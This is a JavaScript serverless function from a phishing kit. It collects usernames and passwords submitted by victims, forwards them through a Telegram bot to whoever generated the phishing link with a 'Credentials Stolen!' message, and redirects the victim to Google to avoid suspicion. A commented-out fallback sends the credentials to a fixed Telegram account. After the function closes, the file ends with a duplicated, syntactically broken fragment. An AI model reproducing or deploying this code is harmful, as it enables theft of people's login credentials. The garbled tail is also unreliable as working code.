const { send } = require('micro');
const { parse } = require('url');
const microBody = require('micro-body');
const { Telegraf } = require('telegraf');

// Re-initialize Telegraf bot here as each Vercel function runs in isolation.
const bot = new Telegraf(process.env.BOT_TOKEN);

// This serverless function receives the submitted username and password.
module.exports = async (req, res) => {
    // Ensure it's a POST request
    if (req.method !== 'POST') {
        return send(res, 405, 'Method Not Allowed');
    }

    // Extract the fullUniqueId from the URL path (e.g., /submit-credentials/randomHash_requesterUserId)
    const { pathname } = parse(req.url);
    const fullUniqueId = pathname.split('/').pop(); // This will be like "randomHash_requesterUserId"

    // Extract the requesterUserId from the fullUniqueId
    const parts = fullUniqueId.split('_');
    const requesterUserId = parts.length > 1 ? parseInt(parts[parts.length - 1], 10) : null;

    // Parse the form data (URL-encoded) from the request body
    const body = await microBody(req);
    const username = body.username;
    const password = body.password;

    if (requesterUserId && !isNaN(requesterUserId)) {
        try {
            // Send the stolen credentials directly to the user who requested the link
            await bot.telegram.sendMessage(
                requesterUserId, // Send to the user who generated this link
                `‼️ **Credentials Stolen!** ‼️\n\n**Link ID:** \`${fullUniqueId}\`\n**Username:** \`${username}\`\n**Password:** \`${password}\`\n\n_Note: This link was generated for you._`,
                { parse_mode: 'Markdown' }
            );
        } catch (error) {
            console.error(`Error sending credentials to Telegram user ${requesterUserId}:`, error);
            if (error.response && error.response.error_code) {
                console.error(`Telegram API Error: ${error.response.error_code} - ${error.response.description}`);
            }
        }
    } else {
        console.warn(`Could not determine requesterUserId from uniqueId: ${fullUniqueId}. Credentials received: Username: ${username}, Password: ${password}`);
        // As a fallback, you could send to a hardcoded TARGET_TELEGRAM_USER_ID here if needed
        // const FALLBACK_TARGET_ID = process.env.FALLBACK_TELEGRAM_USER_ID; // Define this in Vercel env
        // if (FALLBACK_TARGET_ID) {
        //     await bot.telegram.sendMessage(FALLBACK_TARGET_ID, `‼️ **Credentials Stolen (Fallback)!** ‼️\n\n**Link ID:** \`${fullUniqueId}\`\n**Username:** \`${username}\`\n**Password:** \`${password}\``, { parse_mode: 'Markdown' });
        // }
    }

    // Redirect the victim to a legitimate site (e.g., Google) to avoid suspicion.
    res.setHeader('Location', 'https://www.google.com');
    send(res, 302, 'Redirecting...');
};            );
        } catch (error) {
            console.error('Error sending credentials to Telegram:', error);
            // Log full error for debugging
            if (error.response && error.response.error_code) {
                console.error(`Telegram API Error: ${error.response.error_code} - ${error.response.description}`);
            }
        }
    }

    // Redirect the victim to a legitimate site (e.g., Google) to avoid suspicion.
    res.setHeader('Location', 'https://www.google.com');
    send(res, 302, 'Redirecting...');
};
